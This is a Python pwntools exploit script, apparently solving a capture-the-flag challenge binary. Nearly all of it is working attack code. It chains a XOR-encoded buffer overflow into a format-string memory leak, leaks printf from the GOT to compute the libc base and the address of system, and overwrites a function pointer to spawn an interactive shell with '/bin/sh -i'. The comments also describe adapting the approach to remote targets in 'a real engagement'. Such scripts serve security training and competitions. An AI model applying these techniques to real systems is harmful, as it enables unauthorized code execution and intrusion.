#!/usr/bin/env python2
from pwn import *
import argparse

context.terminal = ['/usr/bin/terminator', '-x']

parser = argparse.ArgumentParser()
parser.add_argument('--binary', '-b', default='./challenge')
parser.add_argument('--debug', '-d', action='store_true', default=False)
args = parser.parse_args()

elf = ELF(args.binary)

if args.debug:
    p = elf.debug()
else:
    p = elf.process()

# The offset within our password where help begins
help_offset = 40
# The encryption key
key = elf.string(elf.symbols['key'])

# xor the two strings together
def xor(s, k):
    r = ''
    for c,ck in zip(s,k):
        r += chr(ord(c) ^ ord(ck))
    return r

# Register a new user and overwrite the "exit" function
# with a call to "printf" using the plt.
p.recvuntil('>')
p.sendline('register {0} {1}'.format(
    'bob',
    xor('A'*32 + p64(elf.symbols['plt.printf'])[0:4], key)
))

# A quick memory leak primitive based on our new format string
# vulnerability. We know that our input string starts at parameter
# #15. We have to put our format string at the beginning, then 
# reference parameter 16 (since 15 is our input). We also add
# padding for alignment with the 16th parameter. The string read
# uses fgets, and will take in null bytes, but the string processing
# done by the binary will not accept null bytes, thats why the format
# string has to be first
@pwnlib.memleak.MemLeak
def leak(address):
    p.recvuntil('> ')
    p.sendline('quit {0}'.format(
        '%16$s' + '\x00'*6 + p64(address)
    ))
    data = p.recvuntil('> ').split('> ')[0]
    p.unrecv('> ')
    return data+'\x00'

# In this case, we know the binary is running locally and using our libc.
# In a real engagement, you would need to figure out the version of the
# remote operating system and which libc was being used.
#
# There are a few options to do this. First, we can use the last 12 bits
# of the leaked printf address to guess the libc version. Next, since we have
# a generic memory leak vulnerability, we could scan memory prior to the
# leaked address, and look for the beginning of the binary. After that, we
# could identify the library version, leak the entire binary, or even
# just locate the symbol table in memory and resolve the `system` function
# manually.
libc = ELF('/lib/libc.so.6')

# Leak the printf address from the Global Offset Table using our leaking
# primitive (thanks pwntools!). We then use our libc object to subtract
# the offset of printf itself. This gives us the base address of libc.
# Now, we can use the offsets defined in libc to other functions added to
# the base address to find juicy functions such as `system`!
addr = leak.q(elf.symbols['got.printf'])
base_addr = addr - libc.symbols['printf']
system_addr = base_addr + libc.symbols['system']

# Let the user know what we did
log.info('leaked printf address: {0:08x}'.format(addr))
log.info('calculated libc base address: {0:08x}'.format(base_addr))
log.info('calculated system address: {0:08x}'.format(system_addr))
log.info('overwriting "quit" with system (0x{0:08x})'.format(system_addr))

# Overwrite the quit function pointer again, but this time use
# the system function pointer we calculated. Now, whatever we 
# type after "quit" will be passed as an argument to system!
p.recvuntil('> ')
p.sendline('register {0} {1}'.format(
    'bob',
    xor('A'*32 + p64(system_addr).rstrip('\x00'), key)
))

log.info('executing shell...')

# Execute an interactive shell session, and let the user interact with it
# The shell will print a prompt. No need for the pwntools one.
p.recvuntil('> ')
p.sendline('quit /bin/sh -i')
p.sendline('cat flag.txt')
p.interactive(prompt='')